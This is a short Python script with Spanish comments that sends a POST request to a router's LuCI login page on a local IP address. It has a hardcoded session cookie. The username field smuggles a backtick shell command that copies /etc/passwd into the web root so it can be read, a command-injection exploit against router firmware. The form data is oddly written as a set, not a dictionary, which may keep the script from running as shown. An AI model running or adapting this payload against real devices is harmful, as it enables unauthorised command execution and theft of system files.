import requests

# Definir la URL a la que deseas enviar la solicitud POST
url = 'http://192.168.1.252/cgi-bin/luci'

# Definir los datos del formulario
data = {
    'username=user`cp%20/etc/passwd%20/www/test.txt`&password=pass'
}

# Definir los encabezados de la solicitud
headers = {
    'User-Agent': 'Mozilla/5.0 Gecko/20100101 Firefox',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Cookie': 'sysauth=55f19d843ebf2de094b8a8a2acf5c3a7; sysauth=',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Realizar la solicitud POST
response = requests.post(url, data=data, headers=headers)

# Verificar la respuesta
if response.status_code == 200:
    print("Solicitud POST enviada con éxito.")
    print("Respuesta del servidor:", response.text)
else:
    print("Error al enviar la solicitud POST. Código de estado:", response.status_code)
